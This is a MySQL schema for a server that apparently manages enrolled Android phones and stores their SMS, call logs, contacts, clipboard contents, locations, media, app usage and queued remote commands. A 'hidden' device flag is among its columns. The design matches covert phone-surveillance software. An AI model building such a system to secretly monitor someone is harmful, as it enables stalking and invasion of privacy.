-- Server v2 schema (pc69). All InnoDB / utf8mb4. Idempotent.

CREATE DATABASE IF NOT EXISTS pc69 CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS users (
  id INT NOT NULL AUTO_INCREMENT,
  email VARCHAR(191) NOT NULL,
  password_hash VARCHAR(255) NOT NULL,
  role ENUM('admin','viewer') NOT NULL DEFAULT 'admin',
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_users_email (email)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS devices (
  id INT NOT NULL AUTO_INCREMENT,
  user_id INT NOT NULL,
  device_uid VARCHAR(128) NOT NULL,
  label VARCHAR(191) DEFAULT NULL,
  model VARCHAR(191) DEFAULT NULL,
  manufacturer VARCHAR(191) DEFAULT NULL,
  android_release VARCHAR(32) DEFAULT NULL,
  sdk_int INT DEFAULT NULL,
  app_version VARCHAR(32) DEFAULT NULL,
  device_token_hash CHAR(64) DEFAULT NULL,
  enrollment_key_used VARCHAR(191) DEFAULT NULL,
  is_online TINYINT(1) NOT NULL DEFAULT 0,
  hidden TINYINT(1) NOT NULL DEFAULT 0,
  admin_active TINYINT(1) NOT NULL DEFAULT 0,
  battery INT DEFAULT NULL,
  ip_address VARCHAR(64) DEFAULT NULL,
  -- per-device SMS cadence override (seconds); NULL = use SMS_INTERVAL_S
  sms_interval_s INT DEFAULT NULL,
  last_seen DATETIME DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_devices_uid (device_uid),
  KEY idx_devices_user (user_id),
  CONSTRAINT fk_devices_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS device_permissions (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  permission VARCHAR(128) NOT NULL,
  granted TINYINT(1) NOT NULL DEFAULT 0,
  updated_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_perm_device_permission (device_id, permission),
  KEY idx_perm_device (device_id),
  CONSTRAINT fk_perm_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS commands (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  user_id INT DEFAULT NULL,
  action VARCHAR(64) NOT NULL,
  params JSON DEFAULT NULL,
  status ENUM('pending','delivered','ok','error','pending_user','denied','expired') NOT NULL DEFAULT 'pending',
  result_message TEXT DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  delivered_at DATETIME DEFAULT NULL,
  completed_at DATETIME DEFAULT NULL,
  ttl_seconds INT NOT NULL DEFAULT 120,
  PRIMARY KEY (id),
  KEY idx_commands_device_status (device_id, status),
  CONSTRAINT fk_commands_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE,
  CONSTRAINT fk_commands_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS sms_messages (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  address VARCHAR(191) DEFAULT NULL,
  body TEXT DEFAULT NULL,
  direction VARCHAR(16) DEFAULT NULL,
  ts BIGINT DEFAULT NULL,
  dedupe_hash CHAR(64) NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_sms_device_dedupe (device_id, dedupe_hash),
  KEY idx_sms_device (device_id),
  CONSTRAINT fk_sms_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS call_logs (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  number VARCHAR(191) DEFAULT NULL,
  cached_name VARCHAR(191) DEFAULT NULL,
  call_type VARCHAR(24) DEFAULT NULL,
  duration_s INT DEFAULT NULL,
  ts BIGINT DEFAULT NULL,
  dedupe_hash CHAR(64) NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_call_device_dedupe (device_id, dedupe_hash),
  KEY idx_call_device (device_id),
  CONSTRAINT fk_call_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS contacts (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  display_name VARCHAR(191) DEFAULT NULL,
  phone_numbers JSON DEFAULT NULL,
  emails JSON DEFAULT NULL,
  dedupe_hash CHAR(64) NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_contact_device_dedupe (device_id, dedupe_hash),
  KEY idx_contact_device (device_id),
  CONSTRAINT fk_contact_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS clipboard_entries (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  content MEDIUMTEXT DEFAULT NULL,
  captured_at DATETIME DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_clip_device_captured (device_id, captured_at),
  CONSTRAINT fk_clip_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS installed_apps (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  package VARCHAR(191) NOT NULL,
  label VARCHAR(191) DEFAULT NULL,
  version_name VARCHAR(64) DEFAULT NULL,
  first_seen DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  last_seen DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_app_device_package (device_id, package),
  KEY idx_app_device (device_id),
  CONSTRAINT fk_app_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS locations (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  lat DOUBLE DEFAULT NULL,
  lon DOUBLE DEFAULT NULL,
  accuracy DOUBLE DEFAULT NULL,
  ts BIGINT DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_loc_device_ts (device_id, ts),
  CONSTRAINT fk_loc_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS media_files (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  kind VARCHAR(24) NOT NULL,
  filename VARCHAR(255) DEFAULT NULL,
  mime VARCHAR(64) DEFAULT NULL,
  size_bytes INT DEFAULT NULL,
  sha256 CHAR(64) DEFAULT NULL,
  storage_path VARCHAR(512) DEFAULT NULL,
  meta JSON DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_media_device_kind_created (device_id, kind, created_at),
  CONSTRAINT fk_media_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS usage_events (
  id INT NOT NULL AUTO_INCREMENT,
  device_id INT NOT NULL,
  package VARCHAR(191) DEFAULT NULL,
  label VARCHAR(191) DEFAULT NULL,
  total_time_ms BIGINT DEFAULT NULL,
  ts BIGINT DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_usage_device (device_id),
  CONSTRAINT fk_usage_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS app_rules (
  id INT NOT NULL AUTO_INCREMENT,
  user_id INT NOT NULL,
  package VARCHAR(191) NOT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  UNIQUE KEY uq_rule_user_package (user_id, package),
  CONSTRAINT fk_rule_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

CREATE TABLE IF NOT EXISTS audit_log (
  id INT NOT NULL AUTO_INCREMENT,
  user_id INT DEFAULT NULL,
  device_id INT DEFAULT NULL,
  action VARCHAR(64) NOT NULL,
  detail TEXT DEFAULT NULL,
  ip VARCHAR(64) DEFAULT NULL,
  created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
  PRIMARY KEY (id),
  KEY idx_audit_created (created_at),
  CONSTRAINT fk_audit_user FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE SET NULL,
  CONSTRAINT fk_audit_device FOREIGN KEY (device_id) REFERENCES devices(id) ON DELETE SET NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
